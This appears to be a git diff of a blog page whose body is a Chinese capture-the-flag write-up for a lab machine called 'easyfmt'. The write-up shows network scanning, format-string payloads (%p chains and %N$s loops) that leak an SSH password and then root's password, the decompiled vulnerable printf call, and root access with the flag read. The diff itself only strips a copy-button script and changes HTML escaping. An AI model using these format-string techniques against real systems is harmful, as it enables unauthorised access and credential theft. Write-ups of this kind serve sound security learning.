@@ -144,17 +144,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -186,8 +176,8 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1e3eafb96d9812b29d3b5155f0336c4a867a3be8cafc9ccff881914048bd8eb4/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632303138333931353132302e77656270"><img src="https://camo.githubusercontent.com/1e3eafb96d9812b29d3b5155f0336c4a867a3be8cafc9ccff881914048bd8eb4/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632303138333931353132302e77656270" alt="image-20250620183907687" data-canonical-src="https://7r1umphk.github.io/image/20250620183915120.webp" style="max-width: 100%;"></a></p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<div class="markdown-body" id="postBody"><p><img src="https://7r1umphk.github.io/image/20250620183915120.webp" alt="image-20250620183907687" /></p>
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ sudo arp-scan -l           
 [sudo] password for kali: 
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
@@ -202,7 +192,7 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 2.063 seconds (124.09 hosts/sec). 4
                                    
 </code></pre>
 <p>139的ip，进行服务探测</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nmap -p- 192.168.205.139                 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 06:40 EDT
 Nmap scan report for 192.168.205.139
@@ -218,21 +208,21 @@ Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
  
 </code></pre>
 <p>有个1337端口，nc上去瞄一眼</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nc 192.168.205.139 1337 
 welcome:Where is my password?
 root:Well,it's in the stack,just find it.
 </code></pre>
 <p>翻译一下</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ echo "welcome:Where is my password?                  
-root:Well,it's in the stack,just find it." | trans -b :zh 2&gt;/dev/null
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ echo &quot;welcome:Where is my password?                  
+root:Well,it's in the stack,just find it.&quot; | trans -b :zh 2&gt;/dev/null
 欢迎：我的密码在哪里？
 root：嗯，它在堆栈中，只是找到它。
            
 </code></pre>
 <p>提示 堆栈</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nc 192.168.205.139 1337 
 welcome:Where is my password?
 root:Well,it's in the stack,just find it.
@@ -241,7 +231,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </code></pre>
 <p>丢了亿点A过去，回显没价值，<strong>栈溢出</strong>暂时无果</p>
 <p>然后就试了一下<strong>格式化字符串</strong></p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nc 192.168.205.139 1337
 welcome:Where is my password?
 root:Well,it's in the stack,just find it.
@@ -250,10 +240,10 @@ root:Well,it's in the stack,just find it.
 
 </code></pre>
 <p>找到了，拿脚本爆破</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ for i in $(seq 1 40); do echo -n "$i\n"
-pa=$(python3 -c "print('.'.join(['%p'] * $i))")
-echo "$pa" | nc -w 1 192.168.205.139 1337 | tail -n 1
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ for i in $(seq 1 40); do echo -n &quot;$i\n&quot;
+pa=$(python3 -c &quot;print('.'.join(['%p'] * $i))&quot;)
+echo &quot;$pa&quot; | nc -w 1 192.168.205.139 1337 | tail -n 1
 done
 1
 
@@ -338,12 +328,12 @@ done
 
 </code></pre>
 <p>随便拿一行处理一下</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ echo "0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f" | sed 's/0x//g; s/\./\n/g'|while read line; do echo "$line" | xxd -r -p 2&gt;/dev/null |rev 2&gt;/dev/null;done
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ echo &quot;0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f&quot; | sed 's/0x//g; s/\./\n/g'|while read line; do echo &quot;$line&quot; | xxd -r -p 2&gt;/dev/null |rev 2&gt;/dev/null;done
 %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.welcome:Y0u_c4nt_f1nd_m3                                                                                     
 </code></pre>
 <p>welcome:Y0u_c4nt_f1nd_m3</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ ssh welcome@192.168.205.139
 The authenticity of host '192.168.205.139 (192.168.205.139)' can't be established.
 ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
@@ -373,7 +363,7 @@ welcome@easyfmt:~$ id
 uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
 </code></pre>
 <p>找</p>
-<pre class="notranslate"><code class="notranslate">welcome@easyfmt:~$ ls -al
+<pre><code>welcome@easyfmt:~$ ls -al
 total 44
 drwx------ 3 welcome welcome 4096 Jun 17 10:53 .
 drwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..
@@ -444,7 +434,7 @@ open
 welcome:I have found mine.Then,where is your password?
 root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
 welcome:Hahahaha,let's try:
-;*3$"
+;*3$&quot;
 GCC: (Debian 10.2.1-6) 10.2.1 20210110
 crtstuff.c
 deregister_tm_clones
@@ -514,7 +504,7 @@ __cxa_finalize@GLIBC_2.2.5
 .comment
 </code></pre>
 <p>拉过来，丢去ida</p>
-<pre class="notranslate"><code class="notranslate">int __fastcall main(int argc, const char **argv, const char **envp)
+<pre><code>int __fastcall main(int argc, const char **argv, const char **envp)
 {
 char s[68]; // [rsp+10h] [rbp-50h] BYREF
 int fd; // [rsp+54h] [rbp-Ch]
@@ -522,15 +512,15 @@ void *buf; // [rsp+58h] [rbp-8h]
 setuid(0);
 setgid(0);
 buf = malloc(0x18uLL);
-fd = open("/root/pass.txt", 0);
+fd = open(&quot;/root/pass.txt&quot;, 0);
 if ( fd &lt; 0 )
 {
-perror("open");
+perror(&quot;open&quot;);
 exit(1);
 }
-puts("welcome:I have found mine.Then,where is your password?");
-puts("root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.");
-puts("welcome:Hahahaha,let's try:");
+puts(&quot;welcome:I have found mine.Then,where is your password?&quot;);
+puts(&quot;root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.&quot;);
+puts(&quot;welcome:Hahahaha,let's try:&quot;);
 read(fd, buf, 0x18uLL);
 fgets(s, 6, stdin);
 printf(s);
@@ -539,11 +529,11 @@ return 0;
 </code></pre>
 <p>他直接把输入的字符串s当作printf的参数了</p>
 <p>所以继续</p>
-<pre class="notranslate"><code class="notranslate">welcome@easyfmt:/opt$ for i in $(seq 1 20);do
-&gt; p="/opt/vuln"
-&gt; pa="%$i\$s"
-&gt; echo "'$pa'"
-&gt; echo "$pa" | $p
+<pre><code>welcome@easyfmt:/opt$ for i in $(seq 1 20);do
+&gt; p=&quot;/opt/vuln&quot;
+&gt; pa=&quot;%$i\$s&quot;
+&gt; echo &quot;'$pa'&quot;
+&gt; echo &quot;$pa&quot; | $p
 &gt; done
 '%1$s'
 welcome:I have found mine.Then,where is your password?
@@ -640,13 +630,14 @@ root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
 welcome:Hahahaha,let's try:
 </code></pre>
 <p>Y0u_4r3_S0_Gr34t!</p>
-<pre class="notranslate"><code class="notranslate">welcome@easyfmt:/opt$ su -
+<pre><code>welcome@easyfmt:/opt$ su -
 Password: 
 root@easyfmt:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@easyfmt:~# cat /root/root.txt 
 flag{root-8a6fbe864f3154b901643b4943980d5e}
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -671,7 +662,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -718,70 +709,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
